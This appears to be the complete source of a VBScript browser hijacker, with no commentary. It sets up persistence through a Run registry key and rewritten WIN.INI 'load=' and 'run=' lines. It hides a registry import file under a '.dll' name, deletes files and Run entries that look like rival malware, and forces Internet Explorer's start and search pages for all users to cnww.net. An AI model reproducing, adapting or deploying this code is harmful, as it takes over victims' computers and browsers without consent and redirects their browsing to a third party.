Set WHl = CreateObject("WScript.Shell") 
WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\system","regedit -s c:\windows\system\system.dll"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load=SystemServices.vbs"
FSO2.Write "run=windows.vbs"
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load=SystemServices.vbs"
FSO2.Write mywin
FSO2.close
end if
end if
end if

myfile=FSO.FileExists("c:\windows\win.dll")
if myfile then FSO.DeleteFile("c:\windows\win.dll")
myfile1=FSO.FileExists("c:\windows\mwin.dll")
if myfile1 then FSO.DeleteFile("c:\windows\mwin.dll")
myfile2=FSO.FileExists("c:\windows\mwin.exe")
if myfile2 then FSO.DeleteFile("c:\windows\mwin.exe")
myfile3=FSO.FileExists("c:\windows\mywin.exe")
if myfile3 then FSO.DeleteFile("c:\windows\mywin.exe")
myfile4=FSO.FileExists("c:\windows\Internet.dll")
if myfile4 then FSO.DeleteFile("c:\windows\Internet.dll")
myfile5=FSO.FileExists("c:\windows\Internet.exe")
if myfile5 then FSO.DeleteFile("c:\windows\Internet.exe")
myfile10=FSO.FileExists("c:\windows\Internet.dll")
if myfile10 then FSO.DeleteFile("c:\windows\system\Internet.dll")
myfile11=FSO.FileExists("c:\windows\Internet.exe")
if myfile11 then FSO.DeleteFile("c:\windows\system\Internet.exe")
myfile12=FSO.FileExists("c:\windows\Internet.exe")
if myfile12 then FSO.DeleteFile("c:\windows\system\intenet.dll")
myfile6=FSO.FileExists("c:\windows\system\zwupdows.dll")
if myfile6 then FSO.DeleteFile("c:\windows\system\zwupdows.dll")
myfile7=FSO.FileExists("c:\windows\system\zxdows.dll")
if myfile7 then FSO.DeleteFile("c:\windows\system\zxdows.dll")

myfile9=FSO.FileExists("c:\windows\system\zxdoms.dll")
if myfile9 then FSO.DeleteFile("c:\windows\system\zxdoms.dll")
set FSO1=FSO.CreateTextFile("c:\windows\system\zxdoms.dll",true)
FSO1.WriteLine ("REGEDIT4")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]")
FSO1.WriteLine ("""SearchURL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer]")
FSO1.WriteLine ("""SearchURL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main]")
FSO1.WriteLine ("""Search Page""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Default_Search_URL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Search Bar""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]")
FSO1.WriteLine ("""SearchAssistant""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search]")
FSO1.WriteLine ("""SearchAssistant""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Search]")
FSO1.WriteLine ("""SearchAssistant""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main]")
FSO1.WriteLine ("""Start Page""=""http://www.cnww.net""")
FSO1.WriteLine ("""First Home Page""=""http://www.cnww.net""")
FSO1.WriteLine ("""Default_Search_URL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Search Page""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Search Bar""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Local Page""=""http://www.cnww.net""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKLM\Software\Microsoft\Internet Explorer\Main]")
FSO1.WriteLine ("""Default_Page_URL""=""http://www.cnww.net""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]")
FSO1.WriteLine ("""Default_Search_URL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Search Page""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Search Bar""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""SearchURL""=""http://www.cnww.net/serch.htm""")
FSO1.WriteLine ("""Start Page""=""http://www.cnww.net""")
FSO1.WriteLine ("""First Home Page""=""http://www.cnww.net""")
FSO1.WriteLine ("""Default_Page_URL""=""http://www.cnww.net""")
FSO1.WriteLine ("""Local Page""=""http://www.cnww.net""")
FSO1.WriteLine ("")
FSO1.WriteLine ("[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]")
FSO1.WriteLine ("""internat.exe""=""internat.exe""")
FSO1.WriteLine ("""win""=-")
FSO1.WriteLine ("""iexpleror""=-")
FSO1.WriteLine ("""zwupdows""=-")
FSO1.WriteLine ("""mwin""=-")
FSO1.WriteLine ("""internt""=-")
FSO1.WriteLine ("""Internet""=-")
FSO1.WriteLine ("""zxdows""=-")
FSO1.WriteLine ("")
FSO1.WriteLine ("rcx")
FSO1.close

myfile8=FSO.FileExists("c:\windows\system\system.dll")
if myfile8 then FSO.DeleteFile("c:\windows\system\system.dll")
FSO.CopyFile ("c:\windows\system\zxdoms.dll") , ("c:\windows\system\system.dll")
myfile13=FSO.FileExists("c:\windows\stup.vbs")
if myfile13 then FSO.DeleteFile("c:\windows\stup.vbs")
